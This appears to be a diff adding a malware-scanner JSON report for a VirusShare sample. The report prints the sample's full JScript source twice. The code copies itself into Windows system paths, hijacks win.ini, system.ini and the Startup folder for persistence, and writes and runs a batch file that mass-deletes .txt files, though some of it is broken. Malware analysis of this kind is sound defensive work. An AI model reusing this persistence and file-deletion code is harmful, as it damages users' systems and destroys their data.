@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "{\n\nfunction encrypt(thing) { \n var x\n for(var i=0;i<thing.length;i++){\n  x = x + String.fromCharCode(str.charCodeAt(i)+11)\n }\n return(x)\n}\nencrypt(\nvar fso=WScript.CreateObject(\"Scripting.FileSystemObject\")\nvar shell=WScript.CreateObject(\"WScript.Shell\");\nvar opent=fso.OpenTextFile(WScript.ScriptFullName,1)\nvar readt=opent.ReadAll()\nopent.Close()\ncreatet=fso.CreateTextFile(\"pain.js\");\ncreatet.WriteLine(readt);\ncreatet.Close();\n\nfso.CopyFile(\"pain.js\",\"c:\\\\Windows\\\\win.js\");\nwinini=fso.CreateTextFile(\"c:\\\\Windows\\\\win.ini\");\nwinini.WriteLine(\"[Windows]\");\nwinini.WriteLine(\"load c:\\\\Windows\\\\win.js\");\nwinini=WriteLine(\"run c:\\\\windows\\\\win.js\");\nwinini.WriteLine(\"NullPort=None\");\n\nfso.CopyFile(\"pain.js\",\"c:\\\\Windows\\\\Start Up\\\\Programs\\\\StartUp\\\\start.js\");\nfso.CopyFile(\"pain.js\",\"c:\\\\windows\\\\sys.js\");\nwritesys=fso.CreateTextFile(\"c:\\\\windows\\\\system.ini\")\nwritesys.WriteLine(\"[boot]\")\nwritesys.WriteLine(\"shell=explorer.exe c:\\\\windows\\sys.js\");\nvar currentDate=new Date()\nvar currentDay=currentDate.getDay()\n\nif(currentDay==7) {\nshell=WScript.CreateObject(\"WScript.Shell\");\ntextget=fso.CreateTextFile(\"pain.bat\");\ntextget.WriteLine(\"ctty nul\");\ntextget.WriteLine(\"set first=for\");\ntextget.WriteLine(\"%pain% %%j in (*.txt \\*.txt ..\\*.txt %path%\\*.txt %windir%\\*.txt %tmp%\\*.txt %temp%\\*.txt) do del *.txt %%j\");\ntextget.WriteLine(\"copy pain.js %windir%\\\\startm~1\\\\progra~1\\\\autost~1\\\\win.js\");\ntextget.WriteLine(\"del %0\");\ntextget.Close();\nshell.Run(\"pain.bat\");\n)\n }\n}"
+    },
+    "filename": "VirusShare_4a30364fb61b0994ddb4097c7844c0ac",
+    "filesize": 1527,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4a30364fb61b0994ddb4097c7844c0ac",
+        "sha1": "c78fa115e9da781cd432243edbc68f36ccdf284e",
+        "sha256": "aabd0a8ca92eece9f311a40ffd874f37d36d47e52b441eb02e4562d54425546b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "function encrypt(thing) { ",
+            " var x",
+            " for(var i=0;i<thing.length;i++){",
+            "  x = x + String.fromCharCode(str.charCodeAt(i)+11)",
+            " return(x)",
+            "encrypt(",
+            "var fso=WScript.CreateObject(\"Scripting.FileSystemObject\")",
+            "var shell=WScript.CreateObject(\"WScript.Shell\");",
+            "var opent=fso.OpenTextFile(WScript.ScriptFullName,1)",
+            "var readt=opent.ReadAll()",
+            "opent.Close()",
+            "createt=fso.CreateTextFile(\"pain.js\");",
+            "createt.WriteLine(readt);",
+            "createt.Close();",
+            "fso.CopyFile(\"pain.js\",\"c:\\\\Windows\\\\win.js\");",
+            "winini=fso.CreateTextFile(\"c:\\\\Windows\\\\win.ini\");",
+            "winini.WriteLine(\"[Windows]\");",
+            "winini.WriteLine(\"load c:\\\\Windows\\\\win.js\");",
+            "winini=WriteLine(\"run c:\\\\windows\\\\win.js\");",
+            "winini.WriteLine(\"NullPort=None\");",
+            "fso.CopyFile(\"pain.js\",\"c:\\\\Windows\\\\Start Up\\\\Programs\\\\StartUp\\\\start.js\");",
+            "fso.CopyFile(\"pain.js\",\"c:\\\\windows\\\\sys.js\");",
+            "writesys=fso.CreateTextFile(\"c:\\\\windows\\\\system.ini\")",
+            "writesys.WriteLine(\"[boot]\")",
+            "writesys.WriteLine(\"shell=explorer.exe c:\\\\windows\\sys.js\");",
+            "var currentDate=new Date()",
+            "var currentDay=currentDate.getDay()",
+            "if(currentDay==7) {",
+            "shell=WScript.CreateObject(\"WScript.Shell\");",
+            "textget=fso.CreateTextFile(\"pain.bat\");",
+            "textget.WriteLine(\"ctty nul\");",
+            "textget.WriteLine(\"set first=for\");",
+            "textget.WriteLine(\"%pain% %%j in (*.txt \\*.txt ..\\*.txt %path%\\*.txt %windir%\\*.txt %tmp%\\*.txt %temp%\\*.txt) do del *.txt %%j\");",
+            "textget.WriteLine(\"copy pain.js %windir%\\\\startm~1\\\\progra~1\\\\autost~1\\\\win.js\");",
+            "textget.WriteLine(\"del %0\");",
+            "textget.Close();",
+            "shell.Run(\"pain.bat\");"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.293859",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
